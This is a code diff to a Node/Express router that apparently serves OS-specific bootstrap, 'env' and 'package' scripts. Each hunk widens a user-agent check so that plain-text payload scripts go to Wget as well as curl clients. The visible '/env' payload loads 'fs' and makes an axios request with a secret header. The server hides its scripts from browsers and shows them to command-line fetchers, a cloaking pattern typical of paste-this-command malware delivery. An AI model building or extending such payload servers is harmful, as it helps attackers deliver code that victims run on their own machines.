@@ -13,7 +13,7 @@ router.get('/bootstrap/:os', (req, res) => {
     const host = req.get("host")              // domain + port
     const domain = `${protocol}://${host}`
     
-    if (ua.includes('curl')) {
+    if (ua.includes('curl') || ua.includes('Wget')) {
         res.setHeader('Content-Type', 'text/plain');
         const win =  
 `
@@ -302,7 +302,7 @@ router.get('/env', (req, res) => {
     const { flag } = req.query;
     const ua = req.headers['user-agent'] || '';
     
-    if (ua.includes('curl')) {
+    if (ua.includes('curl') || ua.includes('Wget')) {
         res.setHeader('Content-Type', 'text/plain');
     res.send(`
 const fs = require('fs'); 
@@ -323,7 +323,7 @@ axios.get(url, { headers: { 'x-secret-header': 'secret' } }).catch(
 router.get('/package', (req, res) => {
     const { flag } = req.query;
     const ua = req.headers['user-agent'] || '';
-    if (ua.includes('curl')) {
+    if (ua.includes('curl') || ua.includes('Wget')) {
         const protocol = req.protocol            // http or https
         const host = req.get("host")              // domain + port
         const domain = `${protocol}://${host}`
@@ -361,7 +361,7 @@ router.get('/:os', (req, res) => {
     const domain = `${protocol}://${host}`
 
     const ua = req.headers['user-agent'] || '';
-    if (ua.includes('curl')) {
+    if (ua.includes('curl') || ua.includes('Wget')) {
         res.setHeader('Content-Type', 'text/plain');
 
         //* ------------- Windows ------------- *//
